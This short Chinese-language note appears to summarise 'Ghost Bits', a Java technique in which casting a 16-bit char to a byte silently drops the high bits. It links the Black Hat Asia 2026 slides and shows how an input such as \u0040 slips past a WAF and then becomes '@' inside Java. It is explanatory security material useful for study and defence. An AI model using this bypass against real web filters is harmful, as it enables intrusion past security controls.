Ghost Bits

Ghost Bits（幽灵比特位） 是 2026 年 Black Hat Asia 披露的一种 Java 底层类型转换导致的隐蔽绕过攻击面，

地址：i.blackhat.com/Asia-26/Presentations/Asia-26-Bai-Cast-Attack-Ghost-Bits-4.23.pdf

核心原理

Java 中 char（16 位 UTF-16）转 byte（8 位）时，高 8 位被静默丢弃、仅留低 8 位；这些被丢掉的高位就叫 Ghost Bits。

使用\u0040得时候，java的特性，char转byte，只保留低8位，高位直接丢弃。\u0040的00被丢弃，而40就保留变成了@

这个时候WAF看见\u0040没有@就进行的放行，在到java的时候就砍掉了00高位变成了@就实现了绕过
